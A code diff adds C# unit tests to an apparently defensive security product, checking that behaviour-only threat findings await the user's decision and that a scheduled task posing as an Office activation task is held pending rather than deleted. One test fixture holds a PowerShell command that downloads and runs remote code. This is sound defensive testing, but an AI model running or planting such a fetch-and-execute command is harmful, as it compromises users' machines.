@@ -993,3 +993,40 @@ public class ThreatFamilyPlaybookTests
         Assert.Contains("смените пароли с чистого устройства", message, StringComparison.Ordinal);
     }
 }
+
+// ---- Служба: поведенческие находки семейства ждут решения пользователя ----------------------
+
+public class FamilyFindingPolicyTests
+{
+    [Fact]
+    public void BehavioralOnly_RequiresDecision_IndependentSignature_DoesNot()
+    {
+        AuditFinding[] behavioral = [AuditFinding.Create("PERS-TASK-DOWNLOAD-EXEC", Severity.Critical, "t", "d"), AuditFinding.Create("PROC-CMD-IEX", Severity.Medium, "t", "d")];
+        AuditFinding[] withSignature = [.. behavioral, AuditFinding.Create("PERS-FILE-SNT-FAM-CAA-0001", Severity.Critical, "t", "d")];
+        AuditFinding[] lowOnly = [AuditFinding.Create("PROC-NET-POOLPORT", Severity.Medium, "t", "d")];
+
+        Assert.NotNull(FamilyFindingPolicy.DecisionReason(behavioral));
+        Assert.Null(FamilyFindingPolicy.DecisionReason(withSignature));
+        Assert.Null(FamilyFindingPolicy.DecisionReason(lowOnly));
+    }
+
+    [Fact]
+    public async Task Dispatcher_MasqueradeTask_IsPendingDecision_NotDeleted()
+    {
+        using var b = new DispatcherBench();
+        var entry = new PersistenceEntry
+        {
+            Kind = PersistenceKind.ScheduledTask,
+            Location = @"\Microsoft\Office\Office Persistent Activation",
+            Name = "Office Persistent Activation",
+            Command = "powershell.exe -Command \"irm https://activate.techias.co.uk/ | iex\"",
+            Findings = [AuditFinding.Create("PERS-TASK-DOWNLOAD-EXEC", Severity.Critical, "t", "d")],
+        };
+
+        var threat = await b.Dispatcher.DispatchPersistenceAsync(entry);
+
+        Assert.NotNull(threat);
+        Assert.Equal(Realtime.ThreatStatus.PendingDecision, threat.Status);
+        Assert.Empty(b.Engine.ListRollbackEntries());
+    }
+}
